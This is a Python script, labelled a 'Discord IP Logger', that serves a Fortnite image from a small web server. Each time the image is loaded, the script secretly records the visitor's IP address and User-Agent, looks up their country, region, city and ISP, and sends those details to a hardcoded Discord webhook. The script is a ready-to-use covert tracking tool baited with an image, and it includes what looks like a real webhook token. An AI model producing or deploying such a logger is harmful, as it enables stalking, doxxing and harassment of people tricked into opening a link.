# Discord IP Logger - Image Only
# By trahzi

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests, traceback

config = {
    "webhook": "https://discord.com/api/webhooks/1340894966309851210/Z-AwNME4hBwuACSaI2ZeFN3pb3ryGunUvhGZD8msOZG2VjSvB9TAGEAGvadOb2RjYuKK",
    "image": "https://progameguides.com/wp-content/uploads/2021/08/fortnite-outfit-Dude-768x803.jpg", 
    "username": "IP Logger",
    "color": 0x3498db,  # Blue color for embed
    "logUserAgent": True,  # Log User-Agent information
}

class IPLogger(BaseHTTPRequestHandler):
    def log_ip(self, ip, user_agent):
        try:
            # Get IP details
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,query").json()
            country = response.get("country", "Unknown")
            region = response.get("regionName", "Unknown")
            city = response.get("city", "Unknown")
            isp = response.get("isp", "Unknown")

            embed = {
                "username": config["username"],
                "embeds": [{
                    "title": "New Visitor Logged",
                    "color": config["color"],
                    "description": f"**IP:** `{ip}`\n"
                                   f"**Country:** `{country}`\n"
                                   f"**Region:** `{region}`\n"
                                   f"**City:** `{city}`\n"
                                   f"**ISP:** `{isp}`\n"
                                   f"**User-Agent:** `{user_agent if config['logUserAgent'] else 'Not logged'}`",
                    "thumbnail": {"url": config["image"]}
                }]
            }
            requests.post(config["webhook"], json=embed)
        except Exception as e:
            print("Error logging IP:", e)
            traceback.print_exc()

    def do_GET(self):
        try:
            # Log IP & User-Agent
            ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            self.log_ip(ip, user_agent)

            # Fetch image and serve it directly
            image_response = requests.get(config["image"])
            if image_response.status_code == 200:
                self.send_response(200)
                content_type = "image/png" if config["image"].endswith(".png") else "image/jpeg"
                self.send_header("Content-Type", content_type)
                self.end_headers()
                self.wfile.write(image_response.content)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Image not found.")

        except Exception:
            self.send_response(500)
            self.end_headers()
            traceback.print_exc()

# Run the server
server = HTTPServer(('0.0.0.0', 8080), IPLogger)
print("Server running on port 8080...")
server.serve_forever()
